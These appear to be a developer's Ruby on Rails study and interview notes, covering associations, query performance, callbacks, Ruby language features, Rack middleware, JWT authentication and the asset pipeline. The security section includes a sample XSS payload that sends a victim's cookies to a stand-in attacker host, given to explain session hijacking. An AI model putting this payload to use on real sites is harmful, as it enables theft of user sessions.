# Self referential models
# - Here the employee has his/her manager which again is an employee only, a manager who is an employee can have many subordinates (vice-versa).

class Employee < ApplicationRecord
  belongs_to :manager, class_name: 'Employee', optional: true
  has_many :subordinates, class_name: 'Employee', foreign_key: 'manager_id'
end

# ==========================================

# Eager loading in rails

includes: It makes 2 different queries to load the data. It loads the parent and child records in 2 different queries. (We can add conditions to the child records as well)
preload: It makes 2 different queries to load the data. It loads the parent and child records in 2 different queries. (We cannot add conditions to the child records)
eager_load: It makes 1 single query to load the data. It loads the parent and child records in a single query using a LEFT OUTER JOIN.


# Q. What are some of the database level operations that can be performed so that it improves the performance of the system -

1. Indexing -
- Indexes can significantly increase the speed of data retrieval
CREATE INDEX index_name ON table_name (column_name);

- Using composite indexes can help as well which queries on multiple columns at once
CREATE INDEX index_name ON table_name (column_1, column_2);

2. Query Optimization -
- Analyze Query Execution Plans , use Explain like tools for examining queries
EXPLAIN SELECT * FROM table_name WHERE column_name = value;
Refactor queries to avoid unnecessary complexity, use joins efficiently, and avoid operations that require scanning large tables.

3. Normalize Tables (please check in question-asked.rb)
remove redundancy from the tables and shorten the size of tables so that queries are efficient and data is lesser.

4. Denormalize -
Sometimes, denormalization (introducing redundancy) can improve performance by reducing the number of joins required for complex queries. This should be done carefully to balance between performance and data integrity.

5. Implement Caching -
Use caching mechanisms (like query caching or object caching) to store the results of expensive queries or frequently accessed data.
# source: https://guides.rubyonrails.org/v4.1/caching_with_rails.html#:~:text=Query%20caching%20is%20a%20Rails,query%20against%20the%20database%20again.

#  >> Page Caching
  # Here we serve the static content using web-servers like (nginx or apache) without invoking the rails stack
  # Note here we cannot use authentication flow so this is completely static content without authentication.

  # >>  Action Caching (Deprecated in rails 4)
  # pages that require authentication. This is where Action Caching comes in. Action Caching works like Page Caching except the incoming web request hits the Rails stack so that before filters can be run on it before the cache is served.

  # >> Fragment Caching
  # Fragment Caching allows a fragment of view logic to be wrapped in a cache block and served out of the cache store when the next request comes in.

  <% Order.find_recent.each do |o| %>
    <%= o.buyer.name %> bought <%= o.product.name %>
  <% end %>

  <% cache do %>
    All available products:
    <% Product.all.each do |p| %>
      <%= link_to p.name, product_url(p) %>
    <% end %>
  <% end %>


6. Table Partitioning -
Split large tables into smaller, more manageable pieces based on certain criteria (like date ranges). This can improve query performance and manageability.
  CREATE TABLE table_name (
    id INT,
    data VARCHAR(255),
    created_at DATE
  ) PARTITION BY RANGE (YEAR(created_at)) (
    PARTITION p0 VALUES LESS THAN (2000),
    PARTITION p1 VALUES LESS THAN (2010),
    PARTITION p2 VALUES LESS THAN (2020)
  );

7. Database Sharding -
Distribute data across multiple database instances to balance load and improve performance. This involves partitioning data across different databases.

8. Use Connection Pools -
Implement connection pooling to reuse database connections instead of creating new ones for each request. This reduces the overhead associated with connection management.

# config/database.yml:
# production:
#   adapter: postgresql
#   encoding: unicode
#   database: my_app_production
#   pool: 10   # Number of connections in the pool
#   timeout: 5000  # Timeout in milliseconds (5 seconds)

ActiveRecord::Base.connection_pool.with_connection do |conn|
  result = conn.execute("SELECT COUNT(*) FROM users")
  puts result.values
end

9. Monitoring and Profiling -
Continuously monitor database performance using tools and metrics to identify and address performance issues.
Use profiling tools to analyze query performance and find slow queries.

10. Data Archiving -
Move historical or infrequently accessed data to separate archive tables or databases to keep the active tables smaller and more performant.

11. Concurrency Control -
Properly manage locks and transactions to avoid contention and ensure efficient concurrency control.

12. Data Compression -
Use data compression techniques to reduce the size of the data stored on disk and the amount of I/O required.

Q. after_create vs after_save vs after_commit -

after_create: Runs after create but before commit.
after_save: Runs after create or update but before commit.
after_commit: Runs after the entire transaction has been committed.

after_create: Only runs on create.
after_save: Runs on both create and update.
after_commit: Runs after any transaction (can be scoped to on: :create, on: :update, or on: :destroy).

after_commit is the safest choice for actions that rely on the data being fully committed (e.g., sending emails or enqueuing background jobs) since it only runs after the transaction is complete and the data is fully persisted.

class User < ApplicationRecord
  after_commit :send_welcome_email, on: :create

  private

  def send_welcome_email
    UserMailer.welcome_email(self).deliver_later
  end
end


Q. Garbage Collection in ruby

- The garbage collector (GC) is responsible for finding and freeing unused objects.

Object Allocation: When you create a new object, memory is allocated for that object from the heap.
Mark Phase: The GC identifies all objects that are still in use by traversing object references starting from root objects.
Sweep Phase: The GC scans through the heap, freeing objects that were not marked in the mark phase.
Generational Promotion: Objects that survive multiple garbage collection cycles are promoted to the old generation.

- Commands for manually triggering garbage collection.
GC.start: Manually initiate garbage collection.
GC.enable: Enable garbage collection.
GC.disable: Disable garbage collection.
GC.stat: Get statistics about the garbage collector.
GC.compact: Manually trigger a compaction of the heap (Ruby 2.7+).

- Use tools like memory_profiler or ruby-prof to profile memory usage and identify memory leaks.


Q. Counter cache in rails -

Rails counter caches are a mechanism to keep track of the number of associated records efficiently. Instead of performing a COUNT query every time the count of associated records is needed, Rails stores the count in a dedicated column on the parent record, updating it automatically as records are created or destroyed.

Add an integer column to the parent model to store the count of associated records. By convention, this column is named #{association_name}_count.

rails generate migration AddCommentsCountToPosts comments_count:integer
class Comment < ApplicationRecord
  belongs_to :post, counter_cache: true
end

Manually resetting the counters -
Post.reset_counters(post.id, :comments)


Q. Active record vs Application Record

ActiveRecord is a module in Rails that provides an interface between Ruby classes and database tables. It is part of the Active Record pattern, an ORM (Object-Relational Mapping) system that allows developers to interact with the database using Ruby objects instead of writing raw SQL queries.

ApplicationRecord is a convention introduced in Rails 5. It serves as the superclass for all application-specific models. By inheriting from ApplicationRecord instead of directly from ActiveRecord::Base, you have a centralized place to define behavior and configuration that applies to all models in your application.

class ApplicationRecord < ActiveRecord::Base
  self.abstract_class = true

  # Common behavior for all models can be defined here
  def self.recent
    order(created_at: :desc)
  end
end

Q. Monkey Patching

Suppose you want to add a custom method to all ActiveRecord models. You can open the ActiveRecord::Base class and add your method:

module ActiveRecordExtensions
  def last_updated_at
    order(updated_at: :desc).first&.updated_at
  end
end

ActiveRecord::Base.extend(ActiveRecordExtensions)


Q. .send() vs .call()

.send: Used to call methods dynamically by name on an object, including private and protected methods.
.call: Used to execute a Proc or Lambda.
.send: Allows dynamic invocation of methods where the method name is determined at runtime.
.call: Executes a block of code that has already been defined as a Proc or Lambda.


Q. Procs and Lambdas

Arguments handling -
- Procs are more lenient with arguments. They do not enforce the number of arguments passed to them. If too few arguments are given, the missing arguments are set to nil. If too many arguments are given, the extra arguments are ignored.
my_proc = Proc.new { |x, y| puts "x: #{x}, y: #{y}" }
my_proc.call(1)            # Outputs: x: 1, y:
my_proc.call(1, 2, 3)      # Outputs: x: 1, y: 2
-  Lambdas are strict with arguments.
my_lambda = ->(x, y) { puts "x: #{x}, y: #{y}" }
my_lambda.call(1)            # Raises ArgumentError
my_lambda.call(1, 2, 3)      # Raises ArgumentError

Return handling -
Procs: When a return statement is used inside a Proc, it returns from the method enclosing the Proc, not just from the Proc itself. This can cause unexpected behavior if not carefully managed.
def proc_example
  my_proc = Proc.new { return "Returning from Proc" }
  my_proc.call
  "This line is never reached"
end

puts proc_example  # Outputs: Returning from Proc

Lambdas: When a return statement is used inside a lambda, it returns from the lambda itself, not from the enclosing method.
def lambda_example
  my_lambda = -> { return "Returning from Lambda" }
  my_lambda.call
  "This line is reached"
end

puts lambda_example  # Outputs: This line is reached

Procs are generally used when you want a more flexible and forgiving block of code. They are useful for callbacks and general block handling where the argument count and return behavior are less critical.
Lambdas are used when you need stricter argument checking and more predictable return behavior. They are often used in functional programming contexts and where the behavior needs to be more controlled


Q. Calling block, procs and lambdas

Blocks -
def my_method(&block)
  block.call('hello') if block
end

def my_method
  yield("hello") if block_given?
end

my_method do |greeting|
  "this is block called with yield - #{greeting}"
end

my_method { |greeting| puts "This is block greating - #{greeting}" }

Procs -

def my_method(proc1, proc2)
  proc1.call
  proc2.call
end

proc1 = Proc.new { "This is a proc1" }
proc2 = Proc.new { "This is a proc2" }

my_method(proc1, proc2)


Q. Ways of declaring class methods in ruby -

Using 'self' -
class MyClass
  def self.class_method
    "This is a class method"
  end
end

puts MyClass.class_method  # Outputs: This is a class method

Using class << self-
class MyClass
  class << self
    def class_method1
      "Class method 1"
    end

    def class_method2
      "Class method 2"
    end
  end
end
puts MyClass.class_method1  # Outputs: Class method 1
puts MyClass.class_method2  # Outputs: Class method 2

Using Module extend -
module MyModule
  def class_method
    "This is a class method from MyModule"
  end
end
class MyClass
  extend MyModule
end
puts MyClass.class_method  # Outputs: This is a class method from MyModule


Q. What are singleton methods in ruby

A singleton method is a method that is defined on a single object rather than on the class or module to which the object belongs.
This means the method is only available to that particular object and not to other instances of the same class or module.

object = "I am a string"
def object.unique_method
  "This is a singleton method"
end
puts object.unique_method  # Outputs: This is a singleton method


object = "I am a string"
object.define_singleton_method(:dynamic_method) do
  "This is a dynamically defined singleton method"
end
puts object.dynamic_method  # Outputs: This is a dynamically defined singleton method


Q. Singleton Class

singleton class (also known as a metaclass or eigenclass) is a special class that is associated with a single object. Each object in Ruby has its own singleton class where methods and properties specific to that object can be defined.

object = "I am a string"
class << object # singleton class
  def unique_method
    "This is a singleton method"
  end
end
puts object.unique_method  # Outputs: This is a singleton method


Q. RESTful vs REST

REST (Representational State Transfer)
REST is an architectural style for designing networked applications.  It was introduced by Roy Fielding in his doctoral dissertation and is based on a set of principles and constraints that aim to make web services more scalable, stateless, and efficient.

RESTful refers to systems, APIs, or applications that adhere to the principles and constraints of REST.
When a system is described as RESTful, it means that it follows the REST architectural style and implements its principles effectively.

characteristics -
Resource-Oriented: RESTful systems are designed around resources and their representations. Each resource is accessible through a unique URI.
HTTP Methods: RESTful APIs use standard HTTP methods (GET, POST, PUT, DELETE) to perform operations on resources.
Stateless: Each request to a RESTful API must contain all the information necessary to process the request, as no state is stored on the server between requests.
Representation: Resources can be represented in various formats (e.g., JSON, XML). The client interacts with the resource through its representation.

RESTful Api design
class UsersController < ApplicationController
  # GET /users
  def index
    @users = User.all
    render json: @users
  end

  # GET /users/:id
  def show
    @user = User.find(params[:id])
    render json: @user
  end

  # POST /users
  def create
    @user = User.new(user_params)
    if @user.save
      render json: @user, status: :created
    else
      render json: @user.errors, status: :unprocessable_entity
    end
  end

  # PUT /users/:id
  def update
    @user = User.find(params[:id])
    if @user.update(user_params)
      render json: @user
    else
      render json: @user.errors, status: :unprocessable_entity
    end
  end

  # DELETE /users/:id
  def destroy
    @user = User.find(params[:id])
    @user.destroy
    head :no_content
  end

  private

  def user_params
    params.require(:user).permit(:name, :email)
  end
end



Q. Has many :through and has_and_belongs_to_many

Has many :through ->

class Patient
  has_many :appointments
  has_many :doctors, through: :appointments
end
class Doctor
  has_many :appointments
  has_many :patients, through: :appointments
end
class Appointment
  belongs_to :patient
  belongs_to :doctor
end

Appointment table - foreign_keys - patient_id, doctor_id

The has_many :through association is also useful for setting up "shortcuts" through nested has_many associations. For example, if a document has many sections, and a section has many paragraphs, you may sometimes want to get a simple collection of all paragraphs in the document. You could set that up this way:

class Document
  has_many :sections
  has_many :paragraphs, through: :sections
end

class Section
  belongs_to :document
  has_many :paragraphs
end

class Paragraph
  belongs_to :section
end

Section table - foreign_key - document_id
Paragraph table - foreign_key - section_id

@document.paragraphs =


has_and_belongs_to_many -->

class Author < ApplicationRecord
  has_and_belongs_to_many :books
end
class Book < ApplicationRecord
  has_and_belongs_to_many :authors
end

For a has_and_belongs_to_many association, you need to create a join table that connects the two models. The join table typically contains foreign keys for the associated models.
For example, if you have models Author and Book, the join table should be named 'authors_books'.

# Migration to create the join table
class CreateAuthorsBooksJoinTable < ActiveRecord::Migration[6.1]
  def change
    create_join_table :authors, :books do |t|
      t.index :author_id
      t.index :book_id
    end
  end
end

schema of join_table -
CREATE TABLE authors_books (
  author_id INTEGER NOT NULL,
  book_id INTEGER NOT NULL,
  PRIMARY KEY (author_id, book_id),
  FOREIGN KEY (author_id) REFERENCES authors(id),
  FOREIGN KEY (book_id) REFERENCES books(id)
);


Q. Polymorphic Association

With polymorphic associations, a model can belong to more than one other model, on a single association.
Polymorphic means having many forms, so for example in an ecommerce application, There is picture associated with customer profile image, seller profile image, product image, review image etc.

class Picture < ApplicationRecord
  belongs_to :imageable, polymorphic: true
end

class Employee < ApplicationRecord
  has_many :pictures, as: :imageable
end

class Product < ApplicationRecord
  has_many :pictures, as: :imageable
end

Migration -
class CreatePictures < ActiveRecord::Migration[6.0]
  def change
    create_table :pictures do |t|
      t.string  :name
      t.bigint  :imageable_id
      t.string  :imageable_type
      t.timestamps
    end

    add_index :pictures, [:imageable_type, :imageable_id]
  end
end

class CreatePictures < ActiveRecord::Migration
  def change
    create_table :pictures do |t|
      t.string :name
      t.bigint :imageable_id
      t.string :imageable_type
    end
  end
end

Pictures table now has - foreign_key - imageable_id, and an imageable type

@employee.pictures =
SELECT p.*
FROM pictures p
JOIN employees e ON e.id = p.imageable_id
WHERE p.imageable_type = 'Employee'


Q. Rack Middleware in rails

- Rack is a minimal, modular, and adaptable interface for developing web applications in Ruby. It provides a common API for connecting web servers and web frameworks.nd adaptable interface for developing web applications in Ruby. It provides a common API for connecting web servers and web frameworks.
For example with Rack I can have separate stages of the pipeline doing:

Authentication: when the request arrives, are the users logon details correct? How do I validate this OAuth, HTTP Basic Authentication, name/password?

Authorisation: is the user authorised to perform this particular task?, i.e. role-based security.

Caching: have I processed this request already, can I return a cached result?

Decoration: how can I enhance the request to make downstream processing better?

Performance & Usage Monitoring: what stats can I get from the request and response?

Execution: actually handle the request and provide a response.


- Middleware in Rack
Middleware is a component that sits between the web server and the web application.
- Each middleware component can handle various aspects of the request/response lifecycle, such as logging, authentication, session management, and more.
- In Rails, middleware components are used extensively to manage the request/response cycle. When an HTTP request is received, it passes through a series of middleware components before reaching the Rails application. Similarly, the response generated by the Rails application passes back through the middleware stack before being sent to the client.

Creating Custom Middleware
class SimpleLogger
  def initialize(app)
    @app = app
  end

  def call(env)
    start_time = Time.now
    status, headers, response = @app.call(env)
    end_time = Time.now
    puts "Request took #{end_time - start_time} seconds"
    [status, headers, response]
  end
end

Using the middleware
# config/application.rb

module YourApp
  class Application < Rails::Application
    # Add custom middleware to the middleware stack
    config.middleware.use SimpleLogger
  end
end

Common Middleware in rails -
Rack::Runtime: Sets an X-Runtime header, indicating the time taken to process the request.
ActionDispatch::ShowExceptions: Rescues exceptions and displays error pages.
ActionDispatch::Static: Serves static files from the public directory.
Rack::Session::Cookie: Manages session data stored in cookies.
Rack::MethodOverride: Allows HTTP method overriding using a special _method parameter.

command for checking which middlewares are being used -
rails middleware


Q. Method Overloading in Ruby

Method overloading is a feature in some programming languages where multiple methods can have the same name but different parameters (i.e., different number or types of arguments). However, Ruby does not support method overloading in the traditional sense.

you can achieve similar functionality using the following techniques:

Default Arguments -
def greet(name, greeting = "Hello")
  puts "#{greeting}, #{name}!"
end
greet("Alice")
greet("Bob", "Hi")

Variable-Length Argument Lists (*args) -
def sum(*numbers)
  numbers.reduce(0) { |sum, number| sum + number }
end
puts sum(1, 2, 3)          # Output: 6
puts sum(1, 2, 3, 4, 5)

Keyword Arguments
def introduce(name:, age:, city: "Unknown")
  puts "Name: #{name}, Age: #{age}, City: #{city}"
end
introduce(name: "Alice", age: 30)                       # Output: Name: Alice, Age: 30, City: Unknown
introduce(name: "Bob", age: 25, city: "New York")


Q. What is Duck Typing

In Ruby, duck typing means that if an object implements the methods that you expect, you can use it without worrying about its class. This leads to more flexible and reusable code.
Flexibility: Duck typing allows for more flexible and reusable code. You dont have to enforce strict type checks.
Simplicity: It simplifies code by focusing on what an object can do, rather than what it is.
Polymorphism: Duck typing naturally supports polymorphism, where different types can be used interchangeably if they implement the expected methods.

def read_data(source)
  source.read
end
file = File.open("example.txt")
string_io = StringIO.new("Hello, world!")
puts read_data(file)
puts read_data(string_io)

class Car
  def start
    "Car is starting"
  end
end

class Bike
  def start
    "bike is starting"
  end
end

def vehicle_start(source)
  source.start
end

car = Car.new
bike = Bike.new
vehicle_start(car)
vehicle_start(bike)

The read_data method works with any object that has a read method.
Both File and StringIO objects can be passed to read_data because they both implement the read method.


Q. How Duck Typing Achieves Polymorphism

Duck typing in Ruby allows polymorphism by focusing on the methods an object can respond to rather than its class or type
class Circle
  def draw
    puts "Drawing a circle"
  end
end
class Square
  def draw
    puts "Drawing a square"
  end
end
# Method expecting objects with a 'draw' method
def render_shape(shape)
  shape.draw
end
circle = Circle.new
square = Square.new
render_shape(circle)  # Output: Drawing a circle
render_shape(square)  # Output: Drawing a square

The render_shape method expects an object that responds to the draw method.
Both Circle and Square classes implement draw, so they can be used interchangeably with render_shape.
The actual behavior of render_shape depends on the draw method defined in the passed object, demonstrating polymorphism through duck typing.


Q. Common Attacks and How to Secure Rails Applications

1. Session Hijacking
Many web applications have an authentication system: a user provides a user name and password, the web application checks them and stores the corresponding user id in the session hash. From now on, the session is valid. On every request the application will load the user, identified by the user id in the session, without the need for new authentication. The session ID in the cookie identifies the session.
Hence, the cookie serves as temporary authentication for the web application. Anyone who seizes a cookie from someone else, may use the web application as this user - with possibly severe consequences

// XSS attack example
<script>
  fetch('https://malicious-site.com/steal?cookie=' + document.cookie);
</script>

force use ssl over secure encrypted requests
config.force_ssl = true

2. Session Storage
Rails uses ActionDispatch::Session::CookieStore as the default session storage.

3. Session Fixation
They generate a valid session id and then pass it along with request the victim will send, the session is fixated with their session_id and they are able to access the user data.

We can also implement a session expiry time to time, One of the ways is putting a created_at column on the session table. And checking those regularly and expiring it so that user has to re-authenticate and the cookies and session hash is updated with the new session_ids.

4. SQL Injections

Ruby on Rails guards against SQL injection attacks by utilizing parameterized queries. Parameters are passed separately from the SQL statement and ensure that user input is treated as data rather than executable code.

5. CSRF - Cross Site Request Forgery

Cross-Site Request Forgery (CSRF) is a type of web application vulnerability where an attacker tricks a user into performing unwanted actions on a web application in which they are authenticated. In other words, a CSRF attack takes advantage of the trust that a web application has in the users browser.
To better understand CSRF, lets use an analogy. Imagine youre at a coffee shop using a public Wi-Fi network. You log in to your banks website to check your account balance. Meanwhile, a hacker is sitting at another table on the same network. They notice that youre logged in to your banks website and decide to take advantage of your authenticated session. They send a request to your banks website, pretending to be you, and instruct the bank to transfer money from your account to theirs. This would be an example of a CSRF attack.

Out of the box, Rails includes a security feature called protect_from_forgery, which is enabled by default in every new Rails application. This feature helps to prevent CSRF attacks by adding a unique token to each form in your application. This token is also stored in the users session.

Heres an example of how this works in practice: Lets say you have a form in your Rails application that allows users to update their email address. With CSRF protection enabled, the form would look something like this when rendered in the users browser:

<form action="/update_email" method="post">
  <input type="hidden" name="authenticity_token" value="random_token_here">
  <input type="email" name="email">
  <input type="submit" value="Update Email">
</form>

Disabling CSRF protection for an API -
class ApiController < ApplicationController
  skip_before_action :verify_authenticity_token, only: [:update_email]

  def update_email
    # Your code here
  end
end

Customizing the CSRF Token -
you may want to use your own token generation logic. To do this, you can override the form_authenticity_token method in your ApplicationController
class ApplicationController < ActionController::Base
  protect_from_forgery with: :exception

  private

  def form_authenticity_token
    # Your custom token generation logic here
  end
end


Q. Ruby Encapsulation

Encapsulation is defined as the wrapping up of data under a single unit. It is the mechanism that binds together code and the data it manipulates. In a different way, encapsulation is a protective shield that prevents the data from being accessed by the code outside this shield.

class Demoencapsulation

  def initialize(id, name, addr)

   # Instance Variables
   @cust_id = id
   @cust_name = name
   @cust_addr = addr
  end

   # displaying result
   def display_details()
   puts "Customer id: #@cust_id"
   puts "Customer name: #@cust_name"
   puts "Customer address: #@cust_addr"
   end
end

# Create Objects
cust1 = Demoencapsulation .new("1", "Mike",
              "Wisdom Apartments, Ludhiya")
cust2 = Demoencapsulation .new("2", "Jackey",
                "New Empire road, Khandala")

# Call Methods
cust1.display_details()
cust2.display_details()

Here display_details method can be called with only the Demoencapsulation class instances which means it Demoencapsulation logic is encapsulated and restricted to be accessed to only its instances


Q. Ruby Abstraction -

It allows you to hide the internal details and complexities of an object and expose only what is necessary for the operation.
Create classes that represent entities and define methods that perform specific actions.
Using Access Control: Use access control mechanisms like public, protected, and private to control the visibility of methods and variables
Simplifies complex systems by exposing only necessary details and hiding the implementation.


Q. Webhooks vs. APIs

APIs (Application Programming Interfaces) - APIs are sets of rules and protocols that allow one software application to interact with another. They define the methods and data structures that developers can use to interact with a service.
characteristics of apis -
Request/Response Model: APIs typically follow a request/response model where one application (the client) sends a request to another application (the server), and the server responds.
Client-Driven: The client decides when to make a request. This means that the client must periodically check the server for updates or changes (polling).
APIs can be used to perform a wide range of actions, such as retrieving data, updating records, and deleting resources.

Webhooks - Webhooks are a way for an application to provide other applications with real-time information. Webhooks are triggered by events in one system and send an HTTP POST request to another systems URL with the event data.
Event-Driven: There has to a certain event on the server side to trigger the response to the client.
Server-Driven: The server (source system) initiates the communication by sending data to the client (target system) without the client needing to make a request.
REAL TIME UPDATES: Webhooks provide real-time updates, making them ideal for scenarios where immediate notification of an event is crucial.
One-Way Communication:


Q. Multi threading in rails

require 'thread'

counter = 0
mutex = Mutex.new

threads = []

10.times do
  threads << Thread.new do
    1000.times do
      mutex.synchronize do
        counter += 1
        sleep(0.001) # Encourages context switch, Prevents monopolising PC, Simulating Real-World Delays
      end
    end
  end
end

threads.each(&:join)
puts "Counter value: #{counter}"

def start_multiple_threads(batch_records)
  offset = 0
  limit = 1000
  threads = []
  while offset < batch_records.size
    threads << Thread.new { batch_records.offset(offset).limit(limit) }
    offset += limit
  end
  threads.each { |thread| thread.join }
end


Multitencancy
  Multitenancy is a software architecture where a single instance of a software application serves multiple tenants. Each tenant is a group of users who share common access with specific privileges to the software instance.
  Each tenants data is isolated and remains invisible to other tenants.
  There are three main approaches to multitenancy:

  1. Database-per-tenant: Each tenant has its own database. This approach provides the highest level of isolation but can be resource-intensive.
  2. Shared database, separate schema: All tenants share a single database, but each tenant has its own schema. This approach provides a balance between isolation and resource efficiency.
  3. Shared database, shared schema: All tenants share the same database and the same schema. This approach is the most resource-efficient but provides the least isolation.
  4. Hybrid approach: A combination of the above methods, allowing for flexibility based on tenant needs.


Q. What is JWT tokens

JWTs are commonly used for authentication and authorization in web applications. In Rails, JWTs can be used to manage user sessions and ensure secure communication between clients and servers.

A JWT is composed of three parts:
Header: Specifies the algorithm used for signing the token (e.g., HS256).
Payload: Contains the claims, such as user information and expiration time.
Signature: Ensures the token has not been tampered with.
  Some important default/fields in jwt token
    1. iss: Issuer - The entity that issued the token.
    2. sub: Subject - The subject of the token, usually the user ID.
    3. aud: Audience - The intended recipient of the token.
    4. exp: Expiration - The expiration time of the token.
    5. nbf: Not Before - The time before which the token should not be accepted.
    6. iat: Issued At - The time the token was issued.
    7. jti: JWT ID - A unique identifier for the token.

gem 'jwt'


class JsonWebToken
  SECRET_KEY = Rails.application.secrets.secret_key_base

  def self.encode(payload, exp = 24.hours.from_now)
    payload[:exp] = exp.to_i
    JWT.encode(payload, SECRET_KEY)
  end

  def self.decode(token)
    body = JWT.decode(token, SECRET_KEY)[0]
    HashWithIndifferentAccess.new(body)
  rescue JWT::DecodeError => e
    raise e
  end
end

# Creating a JWT token while session creation.
class SessionsController < ApplicationController
  def create
    user = User.find_by(email: params[:email])

    if user&.authenticate(params[:password])
      token = JsonWebToken.encode(user_id: user.id)
      render json: { token: token }, status: :ok
    else
      render json: { error: 'Invalid email or password' }, status: :unauthorized
    end
  end
end

class ApplicationController < ActionController::API
  before_action :authenticate_request

  private

  def authenticate_request
    header = request.headers['Authorization']
    header = header.split(' ').last if header
    decoded = JsonWebToken.decode(header)
    @current_user = User.find(decoded[:user_id])
  rescue ActiveRecord::RecordNotFound, JWT::DecodeError
    render json: { errors: 'Unauthorized' }, status: :unauthorized
  end
end

Q. Rails 4 to Rails 5

Strong Parameters, rails 5 has made convention to use strong params for all the controllers and enforces it.
before_filter -> before_action
Rails 5 required ruby version upgrade as well ruby 2.2 and higher
Ensure that your application and all its dependencies are compatible with the required Ruby version.

Q. Rails 5 to Rails 6

Rails 6 integrates Webpacker as the default JavaScript compiler.
Rails 6 requires Ruby 2.5.0 or higher


https://guides.rubyonrails.org/active_record_multiple_databases.html

# https://guides.rubyonrails.org/asset_pipeline.html#asset-load-order
# https://www.fastruby.io/blog/the-assets-pipeline-history.html

Asset Pipelines in Rails:
  What does sprockets or propshaft do -
    Concatenation
    Minification
    Precompiling
    Fingerprinting: Fingerprinting is a technique that makes the name of a file dependent on the contents of the file. When the file contents change, the filename is also changed. It helps versioning
  Sprockets
    Concatenation
    Minification
    Fingerprinting
    After this steps it adds all the assets in public/assets
  Propshaft
    Only Fingerprinting
    Doesnt perform bundling and minification (jsbuilding-rails cssbuilding-rails gems does it)
  ImportMaps:
    It is basically a hash, If we import "react" - it points to "https://ga.jspm.io/npm:react@17.0.2/index.js" has importmap.rb where you can add mapping
    eg. bin/importmap pin react@17.0.1
    Skips bundling hence no need to webpacker
    No need of yarn or node js
    Cant use it for JSX or TS (ReactJS) where you will also need yarn and node
  TurboStreams
    For live rendering of views
    Can be updated via even workers or models
    Uses websocket
    <turbo-stream>
  TurboFrames
    Internally uses AJAX to fetch HTML
    Instead of reloading whole page only part of page is reloaded


Propshaft does not follow asset include order while sprocket always load the file in the order you provided

Creating an Object
  before_validation
  after_validation
  before_save
  around_save
  before_create
  around_create
  after_create
  after_save
  after_commit / after_rollback

Saving an Object
  before_validation
  after_validation
  before_save
  around_save
  before_create
  around_create

Destroying an Object
  before_destroy
  around_destroy
  after_destroy

Triggering callbacks
    create
    create!
    destroy
    destroy!
    destroy_all
    destroy_by
    save
    save!
    save(validate: false)
    save!(validate: false)
    toggle!
    touch
    update_attribute
    update_attribute!
    update
    update!
    valid?
    validate

Skip callbacks
    decrement!
    decrement_counter
    delete
    delete_all
    delete_by
    increment!
    increment_counter
    insert
    insert!
    insert_all
    insert_all!
    touch_all
    update_column
    update_columns
    update_all
    update_counters
    upsert
    upsert_all

Resource to read:
#* active model vs active record vs active resource >> # https://stackoverflow.com/a/12765490/30052210
#* what is shallow routes in rails? >>>
    # In Ruby on Rails, shallow routes are used to simplify nested routes and make your URLs cleaner and shorter.

    # When you have nested resources, like:
       resources :authors do
         resources :books
       end
    # Rails will generate routes like: /authors/:author_id/books/:id

    # But sometimes you don’t need the parent (author_id) when you're working with a single book, like showing or editing a book.

    # By adding shallow: true, Rails will only include the parent in the routes that need it.
      resources :authors do
        resources :books, shallow: true
      end

    # GET /authors/:author_id/books → list books for an author
    # POST /authors/:author_id/books → create a book for an author
    # GET /books/:id → show a specific book
    # PATCH /books/:id → update a book
    # DELETE /books/:id → delete a book

#* What’s the difference between rake and rails commands?
  # >> Think of rails as the commander of the Rails framework. It helps you do things like start the server (rails server), create a model (rails generate model), or run migrations (rails db:migrate).

  #   On the other hand, rake is like a helper tool that runs tasks defined in .rake files. It’s often used for tasks like setting up the database (rake db:setup) or running custom tasks (rake my_task:run).

#* How rails assets pipeline works?
  >>
  # Preprocessing
  #  It compiles files written in SCSS, CoffeeScript, or ERB into plain CSS/JS.
  #  Example: application.scss → application.cs

  #  Concatenation
  #  It combines multiple files into one.
  #  This reduces the number of HTTP requests (faster load time)

  #  Minification
  #  It removes extra spaces and comments to make files smaller.
  #  This improves performance

  #  Fingerprinting
  #  Adds a unique hash to filenames (like application-abc123.css) to help with cache busting.
  #  Ensures users always get the latest version after deployment

  #  Serving
  #  Rails serves precompiled assets from the /public/assets directory in production.


#* What role does Rack play in Rails? Have you ever built custom middleware? If so, how?
  # Rack is a middleware layer that connects the web server to your Rails application.
  # It takes the incoming HTTP request, sends it to Rails, and then takes Rails' HTTP response and sends it back to the browser.
  # Think of it as the interpreter between the browser and your Rails app.

  # class RequestTimer
  #   def initialize(app)
  #     @app = app
  #   end

  #   def call(env)
  #     start_time = Time.now
  #     status, headers, response = @app.call(env)
  #     duration = Time.now - start_time
  #     Rails.logger.info "Request took #{duration.round(2)} seconds"
  #     [status, headers, response]
  #   end
  # end

  # config.middleware.use RequestTimer

# Metaprogramming in Ruby
# https://courses.bigbinaryacademy.com/learn-rubyonrails/rails-macros-and-metaprogramming/


Action Pack vs Action View in rails
  Action Pack: It handles routing, controllers, and request/response handling.
      Action Controller: It handles the request/response handling.
      Action Dispatch: It handles the routing. decides which controller, method to use based on the request.

  Action View: It handles the rendering of views, partial views, helpers, etc.



# Whats new in rails 8

# for security reason rails introduced new gem called as brakeman
# to execute it run bin/brakeman
